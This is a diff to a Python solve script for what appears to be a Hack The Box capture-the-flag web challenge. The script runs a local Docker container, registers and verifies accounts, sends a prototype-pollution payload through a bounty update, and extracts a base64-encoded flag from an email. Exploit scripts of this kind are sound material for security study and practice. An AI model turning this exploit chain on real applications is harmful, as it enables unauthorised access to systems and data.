@@ -3,6 +3,9 @@ from bs4 import BeautifulSoup
 import os
 from time import sleep
 import sys
+import re
+from base64 import b64decode
+
 class API:
     def __init__(self, base_url: str):
         self.base_url = base_url
@@ -59,7 +62,6 @@ class Mail:
             if td:
 
                 verification_code = td.text.split('Your verification code is:')[1].strip()
-                print(f"[+] Verification Code: {verification_code}")
                 return verification_code
             else:
                 print("Verification code not found.")
@@ -85,48 +87,50 @@ payload = {
         }
     }
 
-api = API("http://localhost:1337")
-mail = Mail()
 
-# Reset the container because the app tends to broken if we fail to use intended pollute
-os.system("docker rm -f web_intergalatic_bounty")
-os.system("docker run --name=web_intergalatic_bounty -d --rm -p1337:1337 -p9080:8080 -it web_intergalatic_bounty")
-sleep(10)
+if __name__ == "__main__":
+    # Reset the container because the app tends to broken if we fail to use intended pollute
+    os.system("docker rm -f web_intergalatic_bounty")
+    os.system("docker run --name=web_intergalatic_bounty -d --rm -p1337:1337 -p9080:8080 -it web_intergalatic_bounty")
+    sleep(10)
+    api = API("http://localhost:1337")
+    mail = Mail()
 
-#login as admin, and 1 other user
-stat, token = api.login()
-if token == None:
+    #login as admin, and 1 other user
     api.register()
     api.register2()
 
 
-#check verify token
-mail.deleteAllVerif()
-resp = api.sendVerifCode()
-if resp.get("status") != 400:
-    api.verifCode = mail.getVerifCode()
-    if api.verifCode:
-        api.submitVerifCode()
-    else:
-        exit()
+    #check verify token
+    mail.deleteAllVerif()
+    resp = api.sendVerifCode()
+    if resp.get("status") != 400:
+        api.verifCode = mail.getVerifCode()
+        if api.verifCode:
+            api.submitVerifCode()
+        else:
+            exit()
 
 
-stat, token = api.login()
-print(token)
-
-if sys.argv[1] == "attack":
+    stat, token = api.login()
+    print(token)
+    
     stat = api.makeBounty(bounty)
-    print(stat)
 
     #Trigger Pollution
     stat = api.updateBounty(7, payload)
-    print(stat)
 
     #Retrieve the flag
+    mail.deleteAllVerif()
     stat = api.sendVerifCode2()
-    print(stat)
 
     #Read The Flag
     huzzah = mail.getVerifCode()
-else:
-    pass
+    regex = r'\b[A-Za-z0-9+/]{4,}={0,2}\b'
+    matches = re.findall(regex, huzzah)
+    for match in matches:
+        try:
+            valid = b64decode(match, validate=True).decode()
+            if "HTB" in valid: print(f"[+] Flag: {valid}")
+        except Exception:
+            pass
